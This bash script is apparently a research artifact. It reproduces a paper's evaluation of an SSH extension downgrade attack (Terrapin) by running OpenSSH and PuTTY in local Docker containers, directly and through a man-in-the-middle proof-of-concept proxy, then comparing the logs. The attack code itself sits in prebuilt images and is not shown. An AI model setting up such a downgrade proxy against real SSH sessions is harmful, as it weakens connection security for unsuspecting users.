#!/bin/bash

SERVER_CONTAINER_NAME="terrapin-artifacts-server"
SERVER_PORT=2200

POC_CONTAINER_NAME="terrapin-artifacts-poc"
POC_PORT=2201

CLIENT_CONTAINER_NAME="terrapin-artifacts-client"

function ensure_images {
  bash $(dirname "$0")/../impl/build.sh
  bash $(dirname "$0")/../pocs/build.sh
}

function print_info {
  echo
  echo "--- SSH extension downgrade attack PoC ---"
  echo
  echo "[i] This script can be used to reproduce the evaluation results presented in section 5.2 of the paper"
  echo "[i] The script will perform the following steps:"
  echo -e "\t 1. Ask user to select server and client implementation to test"
  echo -e "\t 2. Ask user which attack variant should be executed"
  echo -e "\t 3. Start server on port $SERVER_PORT"
  echo -e "\t 4. Start PoC proxy on port $POC_PORT"
  echo -e "\t 5. Start $CLIENT_IMPL_NAME client to connect to the server directly"
  echo -e "\t 6. Start $CLIENT_IMPL_NAME client to conect to the PoC proxy"
  echo -e "\t 7. Compare log files for all connections using less"
  echo "[i] All container will run in --network host to allow for easy capturing via Wireshark on the lo interface"
  echo "[i] Make sure that ports $SERVER_PORT and $POC_PORT on the host are available and can be used by the containers"
  echo
  echo "[i] Note that CBC-EtM PoCs can indicate connection failure due to invalid messages"
  echo "[i] This is expected and intended behaviour as these PoCs are probabilistic and may require several attempts to work"
  echo
}

function select_server {
  echo "[i] This script supports the following SSH servers:"
  echo -e "\t1) OpenSSH 9.5p1"
  echo -e "\t2) OpenSSH 9.4p1 (CBC-EtM Ping unsupported)"
  read -p "[+] Please select SSH server to connect to [1-2]: " SERVER_IMPL

  case $SERVER_IMPL in
    1)
      SERVER_IMPL_NAME="OpenSSH 9.5p1"
      SERVER_IMAGE="terrapin-artifacts/openssh-server:9.5p1" ;;
    2)
      SERVER_IMPL_NAME="OpenSSH 9.4p1"
      SERVER_IMAGE="terrapin-artifacts/openssh-server:9.4p1" ;;
    *)
      echo "[!] Invalid selection, please re-run the script"
      exit 1 ;;
  esac
}

function select_client {
  echo "[i] This script supports the following SSH clients:"
  echo -e "\t1) OpenSSH 9.5p1"
  echo -e "\t2) PuTTY 0.79"
  read -p "[+] Please select SSH client as attack target [1-2]: " CLIENT_IMPL

  case $CLIENT_IMPL in
    1)
      CLIENT_IMPL_NAME="OpenSSH 9.5p1"
      CLIENT_IMAGE="terrapin-artifacts/openssh-client:9.5p1" ;;
    2)
      CLIENT_IMPL_NAME="PuTTY 0.79"
      CLIENT_IMAGE="terrapin-artifacts/putty-client:0.79" ;;
    *)
      echo "[!] Invalid selection, please re-run the script"
      exit 1 ;;
  esac
}

function run_server_direct {
  echo "[+] Starting $SERVER_IMPL_NAME server on port $SERVER_PORT for direct connection"
  if [[ $POC_VARIANT -eq 1 ]]; then
    docker run -d \
      --network host \
      --name "$SERVER_CONTAINER_NAME-direct" \
      $SERVER_IMAGE -d -p $SERVER_PORT -o Ciphers=chacha20-poly1305@openssh.com > /dev/null 2>&1
  else
    docker run -d \
      --network host \
      --name "$SERVER_CONTAINER_NAME-direct" \
      $SERVER_IMAGE -d -p $SERVER_PORT -o Ciphers=aes128-cbc -o MACs=hmac-sha2-256-etm@openssh.com > /dev/null 2>&1
  fi
}

function run_server_poc {
  echo "[+] Starting $SERVER_IMPL_NAME server on port $SERVER_PORT for PoC connection"
  if [[ $POC_VARIANT -eq 1 ]]; then
    docker run -d \
      --network host \
      --name "$SERVER_CONTAINER_NAME-poc" \
      $SERVER_IMAGE -d -p $SERVER_PORT -o Ciphers=chacha20-poly1305@openssh.com > /dev/null 2>&1
  else
    docker run -d \
      --network host \
      --name "$SERVER_CONTAINER_NAME-poc" \
      $SERVER_IMAGE -d -p $SERVER_PORT -o Ciphers=aes128-cbc -o MACs=hmac-sha2-256-etm@openssh.com > /dev/null 2>&1
  fi
}

function select_and_run_poc_proxy {
  echo "[i] This script supports the following extension downgrade attack variants as PoC:"
  echo -e "\t1) ChaCha20-Poly1305"
  echo -e "\t2) CBC-EtM (Unknown)"
  echo -e "\t3) CBC-EtM (Ping)"
  read -p "[+] Please select PoC variant to test [1-3]: " POC_VARIANT

  case $POC_VARIANT in
    1)
      POC_VARIANT_NAME="ChaCha20-Poly1305"
      POC_IMAGE="terrapin-artifacts/ext-downgrade-chacha20-poly1305" ;;
    2)
      POC_VARIANT_NAME="CBC-EtM (Unknown)"
      POC_IMAGE="terrapin-artifacts/ext-downgrade-cbc-unknown" ;;
    3)
      if [[ $SERVER_IMPL -eq 2 ]]; then
        echo "[!] CBC-EtM (Ping) variant requires OpenSSH 9.5p1 as the server. Please re-run the script."
        exit 1
      fi
      POC_VARIANT_NAME="CBC-EtM (Ping)"
      POC_IMAGE="terrapin-artifacts/ext-downgrade-cbc-ping" ;;
    *)
      echo "[!] Invalid selection, please re-run the script"
      exit 1 ;;
  esac
  echo "[+] Selected PoC variant: '$POC_VARIANT_NAME'"

  echo "[+] Starting extension downgrade attack proxy on port $POC_PORT. Connection will be proxied to 127.0.0.1:$SERVER_PORT"
  docker run -d \
    --network host \
    --name $POC_CONTAINER_NAME \
    $POC_IMAGE --proxy-port $POC_PORT --server-ip "127.0.0.1" --server-port $SERVER_PORT > /dev/null 2>&1
}

function run_client_direct {
  echo "[+] Connecting with $CLIENT_IMPL_NAME client to $SERVER_IMPL_NAME server at 127.0.0.1:$SERVER_PORT as user victim"
  if [[ $CLIENT_IMPL -eq 1 ]]; then
    docker run \
      --network host \
      --name "$CLIENT_CONTAINER_NAME-direct" \
      $CLIENT_IMAGE -vvv -o Ciphers=chacha20-poly1305@openssh.com,aes128-cbc -o MACs=hmac-sha2-256-etm@openssh.com -p $SERVER_PORT victim@127.0.0.1 > /dev/null 2>&1
  else
    docker run \
      --network host \
      --name "$CLIENT_CONTAINER_NAME-direct" \
      $CLIENT_IMAGE -v -P $SERVER_PORT -batch -sshlog /dev/stdout victim@127.0.0.1 > /dev/null 2>&1
  fi
}

function run_client_poc {
  echo "[+] Connecting with $CLIENT_IMPL_NAME client to PoC proxy at 127.0.0.1:$POC_PORT as user victim"
  if [[ $CLIENT_IMPL -eq 1 ]]; then
    docker run \
      --network host \
      --name "$CLIENT_CONTAINER_NAME-poc" \
      $CLIENT_IMAGE -vvv -o Ciphers=chacha20-poly1305@openssh.com,aes128-cbc -o MACs=hmac-sha2-256-etm@openssh.com -p $POC_PORT victim@127.0.0.1 > /dev/null 2>&1
  else
    docker run \
      --network host \
      --name "$CLIENT_CONTAINER_NAME-poc" \
      $CLIENT_IMAGE -v -P $POC_PORT -batch -sshlog /dev/stdout victim@127.0.0.1 > /dev/null 2>&1    
  fi
}

function capture_and_compare_outputs {
  docker logs "$SERVER_CONTAINER_NAME-direct" > "$SERVER_CONTAINER_NAME-direct.txt" 2>&1
  docker logs "$SERVER_CONTAINER_NAME-poc" > "$SERVER_CONTAINER_NAME-poc.txt" 2>&1
  docker logs "$POC_CONTAINER_NAME" > "$POC_CONTAINER_NAME.txt" 2>&1
  docker logs "$CLIENT_CONTAINER_NAME-direct" > "$CLIENT_CONTAINER_NAME-direct.txt" 2>&1
  docker logs "$CLIENT_CONTAINER_NAME-poc" > "$CLIENT_CONTAINER_NAME-poc.txt" 2>&1
  diff "$SERVER_CONTAINER_NAME-direct.txt" "$SERVER_CONTAINER_NAME-poc.txt" > "$SERVER_CONTAINER_NAME.txt.diff"
  diff "$CLIENT_CONTAINER_NAME-direct.txt" "$CLIENT_CONTAINER_NAME-poc.txt" > "$CLIENT_CONTAINER_NAME.txt.diff"

  less \
    "$SERVER_CONTAINER_NAME-direct.txt" \
    "$CLIENT_CONTAINER_NAME-direct.txt" \
    "$SERVER_CONTAINER_NAME-poc.txt" \
    "$POC_CONTAINER_NAME.txt" \
    "$CLIENT_CONTAINER_NAME-poc.txt" \
    "$SERVER_CONTAINER_NAME.txt.diff" \
    "$CLIENT_CONTAINER_NAME.txt.diff"

  rm \
    "$SERVER_CONTAINER_NAME-direct.txt" \
    "$CLIENT_CONTAINER_NAME-direct.txt" \
    "$SERVER_CONTAINER_NAME-poc.txt" \
    "$POC_CONTAINER_NAME.txt" \
    "$CLIENT_CONTAINER_NAME-poc.txt" \
    "$SERVER_CONTAINER_NAME.txt.diff" \
    "$CLIENT_CONTAINER_NAME.txt.diff"
}

function stop_containers_direct_only {
  echo "[+] Stopping containers for direct connection"
  docker stop \
    "$SERVER_CONTAINER_NAME-direct" \
    "$CLIENT_CONTAINER_NAME-direct" > /dev/null 2>&1
}

function stop_containers {
  echo "[+] Stopping any remaining containers"
  docker stop \
    "$SERVER_CONTAINER_NAME-direct" \
    "$SERVER_CONTAINER_NAME-poc" \
    "$POC_CONTAINER_NAME" \
    "$CLIENT_CONTAINER_NAME-direct" \
    "$CLIENT_CONTAINER_NAME-poc" > /dev/null 2>&1
}

function remove_containers {
  echo "[+] Removing any remaining artifact containers"
  docker rm \
    "$SERVER_CONTAINER_NAME-direct" \
    "$SERVER_CONTAINER_NAME-poc" \
    "$POC_CONTAINER_NAME" \
    "$CLIENT_CONTAINER_NAME-direct" \
    "$CLIENT_CONTAINER_NAME-poc" > /dev/null 2>&1
}

ensure_images
print_info
select_server
select_client
select_and_run_poc_proxy
run_server_direct
sleep 5
run_client_direct
stop_containers_direct_only
run_server_poc
sleep 5
run_client_poc
stop_containers
capture_and_compare_outputs
remove_containers
